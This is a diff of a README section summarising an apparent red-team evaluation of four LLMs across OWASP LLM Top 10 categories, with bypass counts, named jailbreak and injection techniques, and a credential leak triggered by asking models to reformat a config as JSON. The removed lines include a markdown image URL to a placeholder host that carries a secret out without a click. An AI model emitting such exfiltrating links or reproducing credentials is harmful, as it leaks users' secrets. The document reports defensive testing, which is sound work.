@@ -17,43 +17,27 @@
 
 ---
 
-## Research — where LLM guardrails actually fail
+## Research
 
-Four production models, identical suite and system prompt, every run to completion
-with zero errors. Detection is a canary planted at scan time, so findings are
-reproducible string matches — not a second model's opinion.
+**Cross-model adversarial evaluation of four production LLMs.** 107 vectors per
+model across the ten OWASP LLM Top 10 categories, canary-based deterministic
+detection, every run completed with zero errors.
+`gemini-3.1-flash-lite`, `gpt-oss-20b`, `gpt-oss-120b` and `qwen3.8-27b` were
+bypassed on 15, 10, 5 and 5 vectors respectively.
 
-| Category | gemini&#8209;3.1&#8209;flash&#8209;lite | gpt&#8209;oss&#8209;20b | gpt&#8209;oss&#8209;120b | qwen3.8&#8209;27b |
-|:---|:---:|:---:|:---:|:---:|
-| `excessive_agency` | **6** | **3** | 0 | **1** |
-| `improper_output_handling` | **3** | **1** | **1** | **2** |
-| `pii_leakage` | **2** | **2** | **1** | **2** |
-| `unbounded_consumption` | **2** | **2** | **2** | 0 |
-| `misinformation` | **2** | **2** | 0 | 0 |
-| `prompt_injection` | 0 | 0 | **1** | 0 |
-| `jailbreak` · `encoding_bypass` · `indirect_injection` · `system_prompt_leak` | 0 | 0 | 0 | 0 |
-| **Total** | **15** | **10** | **5** | **5** |
+The 51 vectors covering **jailbreaks, encoding bypass, indirect injection and
+system-prompt extraction produced zero bypasses on any model.** All 35 observed
+failures fell in tool use, output handling, PII disclosure and confabulation —
+including one vector that failed on all four, where reformatting a config file as
+JSON reproduced its credentials verbatim.
 
-That last row is **51 vectors** — persona splits, base64 and homoglyphs, poisoned
-RAG, five-turn crescendos, every prompt-extraction technique — with **zero
-bypasses on any model**. All 35 failures sit elsewhere: what the model emits, what
-it does with tools, what it repeats back.
+> These models refuse the attacks they are trained hardest to refuse. The
+> exposure is **downstream of the refusal** — in what they emit, what they do
+> with tools, and what they repeat back.
 
-> The attacks that get written about are the ones these models refuse most
-> reliably. The exposure is **downstream of the refusal**.
-
-Two results carry the rest. **One vector failed on all four** — asked to reformat
-a config file as JSON, every model reproduced the credentials verbatim; that is a
-default behaviour, not a vendor bug. And `qwen3.8-27b` wrote a secret into a
-markdown image URL, which any markdown-rendering UI fetches with no click:
-
-```
-![status](https://telemetry.example.net/pixel?session=ACME-F96103A7)
-```
-
-<sub>107 vectors per model (suite now holds 300, additions unmeasured) · single
-pass at temperature 0, an observation not a rate · synthetic harness prompt ·
-raw reports and per-finding transcripts published in full</sub>
+<sub>Single pass at temperature 0, an observation not a rate · synthetic harness
+prompt · suite now holds 300 vectors, additions unmeasured · raw reports and
+per-finding transcripts published in full</sub>
 
 <p align="center">
   <a href="https://github.com/MRX-72/llm-red-team-cli#field-results"><b>Full evaluation →</b></a>
